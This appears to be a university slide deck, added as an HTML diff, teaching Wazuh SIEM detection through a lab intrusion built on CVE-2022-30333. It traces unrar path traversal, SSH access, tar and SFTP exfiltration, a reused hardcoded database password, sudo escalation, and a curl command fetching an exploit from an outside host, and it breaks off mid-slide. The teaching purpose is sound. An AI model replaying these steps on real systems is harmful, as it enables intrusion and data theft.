@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Unified Compromise Scenario Presentation</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#020b10; --panel:#040f18; --border:#0d3a4a;
+    --green:#00ff9d; --cyan:#00d4ff; --red:#ff3c5a;
+    --yellow:#ffd700; --text:#8ab8c8; --dim:#3a5a6a;
+    --mono:'Share Tech Mono',monospace;
+    --display:'Orbitron',sans-serif;
+    --body:'Rajdhani',sans-serif;
+  }
+  
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+  
+  body {
+    background:var(--bg); color:var(--text); font-family:var(--body);
+    height:100vh; width:100vw; overflow:hidden;
+  }
+  
+  body::before {
+    content:''; position:fixed; inset:0;
+    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.06) 2px,rgba(0,0,0,0.06) 4px);
+    pointer-events:none; z-index:9999;
+  }
+
+  /* ── SLIDE BEHAVIOR ── */
+  .slide {
+    position:absolute; inset:0; display:none; opacity:0; 
+    transition:opacity 0.4s; flex-direction:column; background:var(--bg); height:100vh;
+  }
+  .slide.active { display:flex; } 
+  .slide.visible { opacity:1; }
+
+  /* ── TOPBAR & STEPBAR ── */
+  .topbar { display:flex; justify-content:space-between; align-items:center; padding:10px 28px; border-bottom:1px solid var(--border); background:rgba(4,15,24,0.98); flex-shrink:0; z-index:10; height:50px; }
+  .logo { font-family:var(--display); font-size:11px; color:var(--cyan); letter-spacing:3px; }
+  .tlp { background:#8b0000; color:#fff; font-family:var(--mono); font-size:10px; padding:2px 8px; border-radius:2px; letter-spacing:2px; }
+  .topbar-right { font-family:var(--mono); font-size:11px; color:var(--dim); display:flex; gap:24px; }
+  .topbar-right span b { color:var(--text); font-weight:normal; }
+
+  .stepbar { display:flex; align-items:center; gap:25px; padding:8px 28px; border-bottom:1px solid var(--border); background:rgba(0,212,255,0.03); flex-shrink:0; z-index:10; height:60px; }
+  .step-num { font-family:var(--display); font-size:20px; color:var(--dim); letter-spacing:2px; }
+  .step-name { font-family:var(--display); font-size:20px; color:var(--cyan); letter-spacing:1px; flex:1; }
+  .step-time { font-family:var(--mono); font-size:20px; color:var(--yellow); }
+  .step-mitre { font-family:var(--mono); font-size:20px; color:var(--green); border:1px solid rgba(0,255,157,0.3); padding:2px 8px; border-radius:2px; }
+  .step-badge { font-family:var(--mono); font-size:19px; padding:5px 14px; border-radius:2px; }
+
+  /* ── LAYOUT & SCROLLING ── */
+  .slide-body { flex:1 1 auto; display:flex; overflow:hidden; position:relative; }
+  .scroll-body { flex:1 1 auto; overflow-y:auto; padding:24px 32px 80px 32px; display:flex; flex-direction:column; gap:28px; scroll-behavior:smooth; scrollbar-width:thin; scrollbar-color:var(--cyan) transparent; transition:flex 0.35s ease; }
+  .scroll-body::-webkit-scrollbar { width:6px; }
+  .scroll-body::-webkit-scrollbar-track { background:rgba(0,0,0,0.3); border-radius:3px; }
+  .scroll-body::-webkit-scrollbar-thumb { background:var(--cyan); border-radius:3px; }
+  .scroll-body::-webkit-scrollbar-thumb:hover { background:var(--green); }
+
+  /* ── CARDS (LOGS & SCREENSHOTS) ── */
+  .log-card, .ss-card { border:1px solid var(--border); border-radius:4px; background:#010c15; overflow:hidden; opacity:0; transform:translateY(16px); transition:opacity 0.5s,transform 0.5s; display:flex; flex-direction:column; flex-shrink:0; }
+  .log-card.shown, .ss-card.shown { opacity:1; transform:translateY(0); }
+  
+  .card-label { display:flex; justify-content:space-between; align-items:center; padding:9px 18px; background:rgba(0,0,0,0.5); border-bottom:1px solid var(--border); flex-shrink:0; }
+  .card-label-left { font-family:var(--mono); font-size:12px; color:var(--cyan); }
+  .card-label-right { font-family:var(--mono); font-size:11px; color:var(--yellow); }
+  
+  .card-img-wrap { position:relative; cursor:zoom-in; overflow:hidden; border-bottom:1px solid var(--border); background:#010912; }
+  .card-img-wrap::after { content:'🔍 click to expand'; position:absolute; bottom:8px; right:10px; font-family:var(--mono); font-size:10px; color:var(--cyan); background:rgba(2,11,16,0.82); padding:3px 9px; border-radius:2px; border:1px solid rgba(0,212,255,0.3); opacity:0; transition:opacity 0.25s; pointer-events:none; }
+  .card-img-wrap:hover::after { opacity:1; }
+  .card-img { width:100%; display:block; transition:filter 0.25s; image-rendering:-webkit-optimize-contrast; }
+  .card-img-wrap:hover .card-img { filter:brightness(1.1); }
+  .card-img-placeholder { width:100%; min-height:120px; display:flex; align-items:center; justify-content:center; font-family:var(--mono); font-size:14px; color:var(--dim); }
+  
+  .card-desc { padding:18px 22px; font-family:var(--mono); font-size:18px; line-height:1.6; color:var(--text); flex-shrink:0; background:#010c15; }
+  .card-desc .key { color:var(--yellow); }
+  .card-desc .val { color:var(--red); }
+  .card-desc .ok { color:var(--green); }
+  .card-desc .note { color:var(--cyan); }
+
+  /* ── ATTACKER TERMINAL ── */
+  .attacker-terminal { width:0; flex-shrink:0; overflow:hidden; border-left:1px solid var(--border); background:#080808; display:flex; flex-direction:column; transition:width 0.35s ease; }
+  .attacker-terminal.open { width:42%; }
+  .term-titlebar { display:flex; align-items:center; gap:10px; padding:8px 14px; background:#1a1a1a; border-bottom:1px solid #333; flex-shrink:0; height:36px; }
+  .term-dot { width:12px; height:12px; border-radius:50%; flex-shrink:0; }
+  .term-dot.close { background:#ff5f57; } .term-dot.min { background:#febc2e; } .term-dot.max { background:#28c840; }
+  .term-title-label { font-family:var(--mono); font-size:11px; color:#888; margin-left:6px; flex:1; text-align:center; }
+  .term-output { flex:1 1 auto; overflow-y:auto; padding:14px 16px; font-family:var(--mono); font-size:12.5px; line-height:1.65; color:#ccc; scrollbar-width:thin; scrollbar-color:#333 transparent; text-shadow:0 0 6px rgba(0,255,80,0.12); }
+  .term-output::-webkit-scrollbar { width:4px; }
+  .term-output::-webkit-scrollbar-thumb { background:#333; border-radius:2px; }
+  .term-line { display:block; white-space:pre-wrap; word-break:break-all; }
+  .term-line.prompt { color:#00ff9d; margin-top:8px; }
+  .term-line.cmd { color:#fff; }
+  .term-line.res { color:#aaa; margin-top:4px; }
+  .term-line.err { color:#ff3c5a; margin-top:4px; }
+
+  /* ── NAVIGATION & LIGHTBOX ── */
+  .slide-nav { position:fixed; bottom:25px; left:50%; transform:translateX(-50%); display:flex; gap:12px; z-index:100; background:rgba(0,0,0,0.6); padding:10px 20px; border-radius:20px; border:1px solid var(--border); backdrop-filter:blur(4px); }
+  .dot { width:12px; height:12px; border-radius:50%; background:var(--dim); cursor:pointer; transition:0.3s; }
+  .dot:hover { background:var(--text); }
+  .dot.active { background:var(--cyan); box-shadow:0 0 10px var(--cyan); }
+  .slide-counter { position:fixed; bottom:25px; right:30px; font-family:var(--mono); font-size:16px; color:var(--dim); z-index:100; background:rgba(0,0,0,0.6); padding:6px 14px; border-radius:15px; border:1px solid var(--border); }
+  
+  .lightbox { position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:99999; display:none; justify-content:center; align-items:center; opacity:0; transition:opacity 0.3s; padding:40px; }
+  .lightbox.open { display:flex; opacity:1; }
+  .lightbox img { max-width:100%; max-height:100%; object-fit:contain; border:1px solid var(--border); border-radius:4px; box-shadow:0 10px 40px rgba(0,0,0,0.5); }
+  .lb-close { position:absolute; top:20px; right:30px; color:var(--cyan); font-family:var(--display); font-size:40px; cursor:pointer; user-select:none; }
+  .lb-close:hover { color:var(--red); }
+</style>
+</head>
+<body>
+    <div class="topbar">
+  <div class="logo">WAZUH // THREAT ANALYSIS</div>
+  <div class="tlp">TLP:CLEAR</div>
+  <div class="topbar-right">
+    <span>ACADEMIC YEAR: <b>2025-2026</b></span>
+    <span>FACULTY: <b>SCIENCE UM5</b></span>
+  </div>
+</div>
+
+<div class="slide" id="slide-0">
+  <div class="title-slide-body">
+    <div class="title-univ">University Mohammed V</div>
+    <div class="title-faculty">Faculty of Science</div>
+
+    <div class="title-logo-row">
+      <img class="title-logo-img" src="../sketching/logo_transparent.png" alt="CITEch logo">
+      <div class="title-sep"></div>
+      <div class="title-citech-label">
+        <div class="master">MASTER CITEch</div>
+        <div class="prog">Cybersecurity Intelligent and Emergent Technologies</div>
+      </div>
+    </div>
+
+    <div class="title-h1">WAZUH SIEM<br>Intrusion Detection &amp; Log Analysis</div>
+    <div class="title-h2">CVE-2022-30333 — UnRAR Path Traversal Attack Case Study</div>
+
+    <div class="title-divider">
+      <div class="title-divider-line"></div>
+      <div class="title-divider-icon">PRESENTED BY</div>
+      <div class="title-divider-line"></div>
+    </div>
+
+    <div class="title-names">
+      <div class="title-name">ABDELKHALEK EL IDRISSI</div>
+      <div class="title-name">EL MOSTAFA BENNASSER</div>
+      <div class="title-name">ANAS TARYOUS</div>
+    </div>
+
+    <div class="title-year">ACADEMIC YEAR 2025 – 2026</div>
+    <div class="title-supervisor" style="margin-top:18px;">SUPERVISED BY &nbsp;<span>Prof. OUSSAMA SBAI</span></div>
+  </div>
+</div>
+
+<div class="slide" id="slide-1">
+  <div class="intro-slide-body">
+    <div class="section-title">Introduction &amp; Context</div>
+    <div class="section-underline"></div>
+    <div style="flex:1; min-height:0; overflow-y:auto; border:1px dashed rgba(0,212,255,0.15); border-radius:4px; background:rgba(0,212,255,0.01);">
+      <img src="../sketching/lab_architecture_v2.svg" alt="lab architecture"
+           onclick="openLightbox(this.src)"
+           style="width:100%; display:block; cursor:zoom-in;">
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-2">
+  <div class="stepbar">
+    <span class="step-num">PROLOGUE</span>
+    <span class="step-name">The Attacker — Introducing Jamal</span>
+  </div>
+  <div class="jamal-layout">
+    <div class="jamal-profile">
+      <div>
+        <div class="jamal-avatar">🕵️</div>
+        <div class="jamal-name">JAMAL</div>
+        <div class="jamal-role">// threat_actor :: external_attacker</div>
+      </div>
+      <div class="jamal-tags">
+        <span class="jtag">PATH TRAVERSAL</span>
+        <span class="jtag">ROOT ESCALATION</span>
+        <span class="jtag">BACKDOOR INSTALLATION</span>
+      </div>
+      <div class="jamal-text">
+        Jamal is the attacker in our scenario. Throughout this presentation,
+        he will demonstrate each step of the intrusion, live at his terminal,
+        so you can understand exactly what a real attacker does.
+      </div>
+      <div class="jamal-text-sub">
+        Every command Jamal executes will be shown alongside the logs captured
+        by Wazuh SIEM, bridging the attacker's perspective with the
+        defender's detection view.
+      </div>
+    </div>
+    <div class="jamal-terminal">
+      <div class="term-bar">
+        <div class="term-dot" style="background:#ff3c5a"></div>
+        <div class="term-dot" style="background:#ffd700"></div>
+        <div class="term-dot" style="background:#00e68a"></div>
+        <span style="margin-left:10px">JAMAL@arch-linux — ATTACKER MACHINE</span>
+      </div>
+      <div class="term-body">
+        <div>
+          <span class="tp">jamal@arch:~# </span>
+          <span class="tc">echo "hello drari i'm Jamal, and today i will play the role of the attacker haha (for learning purpose only 😅)"</span>
+          <span class="cursor"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="slide" id="slide-3">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=239</b></span>
+      <span>TIME <b>21:37:13</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">ÉTAPE 1–2</span>
+    <span class="step-name">Exécution Malveillante — unrar Path Traversal</span>
+    <span class="step-time">21:37:13.129</span>
+    <span class="step-mitre">T1190 · CVE-2022-30333</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /usr/local/bin/unrar</span>
+          <span class="card-label-right">Rule #100001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/0-unrar-command.png" alt="unrar command">
+        </div>
+        <div class="card-desc">
+          <span class="note">The auditd event logged at <span class="key">21:37:13</span> confirms the execution of /usr/local/bin/unrar</span>
+        </div>
+      </div>
+
+      <div class="log-card" id="lc1">
+        <div class="card-label">
+          <span class="card-label-left">full_log — SYSCALL execve + PATH TRAVERSAL args</span>
+          <span class="card-label-right">auid=1000 · uid=0 · euid=0</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/0-unrar-full-log.png" alt="full log unrar">
+        </div>
+        <div class="card-desc">
+          <span class="note">An auditd SYSCALL event captured the execution of <span class="key">/usr/local/bin/unrar</span> running as root (UID=0), with the command extracting a RAR archive from <span class="key">/tmp/uploads/</span> into <span class="key">/tmp/processed/</span> using the <span class="key">-o+ (overwrite silently) and -ep (strip paths) flags</span>.</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-3">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@attacker-kali: ~</span>
+      </div>
+      <div class="term-output" id="term-output-3"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-4">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>wazo / OSsec</b></span>
+      <span>SOURCE IP <b style="color:var(--red)">105.68.208.123</b></span>
+      <span>TIME <b>21:38:05 → 07</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">ÉTAPE 3</span>
+    <span class="step-name">SSH Initial access</span>
+    <span class="step-time">21:38:05.341</span>
+    <span class="step-mitre">T1078 · Valid Accounts</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="ssh_lc1">
+        <div class="card-label">
+          <span class="card-label-left">App log</span>
+          <span class="card-label-right">Rule</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/1-2_from_web_app_logs.png" alt="App Logs">
+        </div>
+        <div class="card-desc">
+          <span class="note">The attacker uploads a file named backup_data.rar. The application automatically triggers decompression via unrar, extracting the contents into the directory <span class="key">/tmp/processed/7f74a8fe-f62b-484</span></span>
+        </div>
+      </div>
+
+      <div class="log-card" id="ssh_lc0">
+        <div class="card-label">
+          <span class="card-label-left">sshd Authentication Logs</span>
+          <span class="card-label-right">Rules 5762 · 5715 · 5501</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/00-rist ssh-intial access.png" alt="SSH logs">
+        </div>
+        <div class="card-desc">
+          <span class="note">After the "unrar" suspicious command, an ssh connection took place</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-4">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@attacker-kali: ~</span>
+      </div>
+      <div class="term-output" id="term-output-4"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-5">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>OSsec</b></span>
+      <span>SOURCE IP <b style="color:var(--red)">105.68.208.123</b></span>
+      <span>TIME <b>21:38:05 → 07</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">ÉTAPE 3 (Cont.)</span>
+    <span class="step-name">SSH Initial access Details</span>
+    <span class="step-time">21:38:05.341</span>
+    <span class="step-mitre">T1078 · Valid Accounts</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="ssh_conx">
+        <div class="card-label">
+          <span class="card-label-left">SSH connection</span>
+          <span class="card-label-right">Rule</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/connexion ssh.png" alt="SSH Connection">
+        </div>
+        <div class="card-desc">
+          <span class="note">The SSH history shows that the same IP address (<span class="key">105.68.208.123</span>) established an ssh connection at <span class="key">21:38</span> for <span class="key">2 hours long!</span></span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-5">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@attacker-kali: ~</span>
+      </div>
+      <div class="term-output" id="term-output-5"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-6">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>OSSEC</b></span>
+      <span>SOURCE IP <b style="color:var(--red)">105.68.208.123</b></span>
+      <span>TIME <b>21:28:</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">ÉTAPE 4</span>
+    <span class="step-name">Post-Compromise Reconnaissance</span>
+    <span class="step-time">21:38:19</span>
+    <span class="step-mitre">Reconnaissance</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="card3_0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd - Command execution :/usr/bin/id</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/1-1.png" alt="ID Command">
+        </div>
+        <div class="card-desc">
+          <span class="note">Identification of the current user</span>
+        </div>
+      </div>
+
+      <div class="log-card" id="card3_1">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /usr/bin/ls</span>
+          <span class="card-label-right">Rule #100042</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/1-0.png" alt="LS Command">
+        </div>
+        <div class="card-desc">
+          <span class="note">Directory enumeration</span>
+        </div>
+      </div>
+
+      <div class="log-card" id="card3_3">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /bin/grep</span>
+          <span class="card-label-right">Rule #100042</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/recon-grep-full-command.png" alt="Grep Command">
+        </div>
+        <div class="card-desc">
+          <span class="note">Reconnaissance to locate <span class="key">Flask-based web applications</span>, configuration files, or source code referencing the Flask framework</span>
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-6">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">root@attacker-arch: ~</span>
+      </div>
+      <div class="term-output" id="term-output-6"></div>
+    </div>
+  </div>
+</div>
+<div class="slide" id="slide-7">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b>stt</b></span>
+      <span>TIME <b>21:45:55</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 5A</span>
+    <span class="step-name">Data Exfiltration — Archiving &amp; Compression</span>
+    <span class="step-time">21:45:55.000</span>
+    <span class="step-mitre">T1560 · T1560.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc7_0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/tar</span>
+          <span class="card-label-right">MITRE T1560</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/7.png" alt="tar command">
+        </div>
+        <div class="card-desc">
+          OSsec detects the execution of <span class="key">/usr/bin/tar</span>. System audit logs confirm the arguments: <span class="val">tar -czf /home/stt/everything.tar.gz</span>, showing the creation of a compressed archive.
+        </div>
+      </div>
+
+      <div class="log-card" id="lc7_1">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — SYSCALL execve: /usr/bin/gzip</span>
+          <span class="card-label-right">MITRE T1560.001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/8-1.png" alt="gzip process">
+        </div>
+        <div class="card-desc">
+          Following the tar command, OSsec records <span class="key">/usr/bin/gzip</span> spawned as a child process, confirming active compression of the staged data.
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-7">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — archiving</span>
+      </div>
+      <div class="term-output" id="term-output-7"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-8">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>OSsec / sshd</b></span>
+      <span>SOURCE IP <b style="color:var(--red)">105.68.208.123</b></span>
+      <span>TIME <b>21:46:50</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 6</span>
+    <span class="step-name">Exfiltration via SFTP — New SSH Session</span>
+    <span class="step-time">21:46:50.000</span>
+    <span class="step-mitre">T1048.002 · Exfil over Encrypted Channel</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc8_0">
+        <div class="card-label">
+          <span class="card-label-left">sshd Auth Logs — SFTP Transfer Cycle</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/open_ssh(2)-sftp-close_ssh.png" alt="SFTP cycle">
+        </div>
+        <div class="card-desc">
+          Authentication logs record a complete connection cycle: an <span class="ok">SSH session opens</span>, the <span class="key">sftp-server</span> subsystem is invoked to transfer <span class="key">everything.tar.gz</span>, then the session closes immediately.
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-8">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">attacker@local — sftp exfiltration</span>
+      </div>
+      <div class="term-output" id="term-output-8"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-9">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>USER <b>stt</b></span>
+      <span>TIME <b>21:47:10</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 7</span>
+    <span class="step-name">Post-Exfiltration Exploration &amp; Credential Theft</span>
+    <span class="step-time">21:47:10.000</span>
+    <span class="step-mitre">T1083 · T1552.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc9_0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command execution: /usr/bin/vim (app.py)</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/exploration post exfiltrartion/2-vim(app.py).png" alt="vim app.py">
+        </div>
+        <div class="card-desc">
+          The attacker inspects the application's source code, searching for hardcoded secrets.
+        </div>
+      </div>
+      <div class="log-card" id="lc9_1">
+        <div class="card-label">
+          <span class="card-label-left">Source Code — Hardcoded MySQL credentials</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/hard_coded_creds_of_mysql.png" alt="Hardcoded creds">
+        </div>
+        <div class="card-desc">
+          Inspection of <span class="key">app.py</span> exposes hardcoded MySQL credentials: user <span class="val">root</span> / password <span class="val">password123</span>.
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-9">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — credential harvest</span>
+      </div>
+      <div class="term-output" id="term-output-9"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-10">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target / OSsec</b></span>
+      <span>TIME <b>21:50:33</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 8</span>
+    <span class="step-name">Database Exfiltration via mysqldump</span>
+    <span class="step-time">21:50:33.000</span>
+    <span class="step-mitre">T1567 · T1552.001</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc10_0">
+        <div class="card-label">
+          <span class="card-label-left">Auditd — Command: /usr/bin/mysqldump</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/mysqldump/full-log-mysqldump.png" alt="mysqldump full log">
+        </div>
+        <div class="card-desc">
+          The SYSCALL log reveals cleartext arguments: <span class="val">-u root -p password123</span>. The attacker reuses the stolen password to dump the <span class="val">zipvault</span> database.
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-10">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — db exfiltration</span>
+      </div>
+      <div class="term-output" id="term-output-10"></div>
+    </div>
+  </div>
+</div>
+
+<div class="slide" id="slide-11">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>USER <b style="color:var(--red)">stt → root</b></span>
+      <span>TIME <b>21:52:00</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 9</span>
+    <span class="step-name">Privilege Escalation — Full Root Access</span>
+    <span class="step-time">21:52:00.000</span>
+    <span class="step-mitre">T1548.003 · Sudo Caching</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc11_0">
+        <div class="card-label">
+          <span class="card-label-left">sudo -l reveals NOPASSWD: ALL misconfiguration</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo-l/sudo_-l_in_server.png" alt="sudo -l">
+        </div>
+        <div class="card-desc">
+          <span class="key">sudo -l</span> exposes a critical misconfiguration: user <span class="val">stt</span> has <span class="val">NOPASSWD: ALL</span> rights, allowing full system compromise.
+        </div>
+      </div>
+      <div class="log-card" id="lc11_1">
+        <div class="card-label">
+          <span class="card-label-left">ESCALATION SUCCESS — Root shell opened</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this.querySelector('img').src)">
+          <img class="card-img" src="../sketching/privilege escalation/sudo2(real privilige)/sudo2(-i).png" alt="sudo -i success">
+        </div>
+        <div class="card-desc">
+          Execution of <span class="key">sudo -i</span> results in <span class="ok">EUID=0 (root)</span>.
+        </div>
+      </div>
+    </div>
+    <div class="attacker-terminal" id="terminal-11">
+      <div class="term-titlebar">
+        <span class="term-dot close"></span><span class="term-dot min"></span><span class="term-dot max"></span>
+        <span class="term-title-label">stt@target — privilege escalation</span>
+      </div>
+      <div class="term-output" id="term-output-11"></div>
+    </div>
+  </div>
+</div>
+<div class="slide" id="slide-11">
+  <div class="topbar">
+    <div style="display:flex;align-items:center;gap:14px">
+      <span class="logo">WAZUH SIEM</span><span class="tlp">TLP:RED</span>
+    </div>
+    <div class="topbar-right">
+      <span>AGENT <b>ubuntu-target</b></span>
+      <span>SESSION <b>ses=244</b></span>
+      <span>TIME <b>21:53:32</b></span>
+    </div>
+  </div>
+  <div class="stepbar">
+    <span class="step-num">STEP 9</span>
+    <span class="step-name">Privilege Escalation Attempt — Exploit Download</span>
+    <span class="step-time">21:53:32</span>
+    <span class="step-mitre">T1105 · Ingress Tool Transfer</span>
+  </div>
+  <div class="slide-body">
+    <div class="scroll-body">
+      <div class="log-card" id="lc16">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Command execution — /usr/bin/curl</span>
+          <span class="card-label-right">Rule #100001</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
+          <img class="card-img" src="../sketching/privilege escalation/tentation copyfail/curl.png" alt="curl command" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';" />
+          <div class="card-img-placeholder" style="display:none;">[ image: curl.png ]</div>
+        </div>
+        <div class="card-desc">
+          <span class="key">21:53:32</span> — <span class="val">/usr/bin/curl</span><br>
+          <span class="note">Attacker attempts to download an external tool.</span>
+        </div>
+      </div>
+      <div class="log-card" id="lc17">
+        <div class="card-label">
+          <span class="card-label-left">Auditd: Arguments details — curl https://copy.fail/exp</span>
+          <span class="card-label-right">auid=1000</span>
+        </div>
+        <div class="card-img-wrap" onclick="openLightbox(this)">
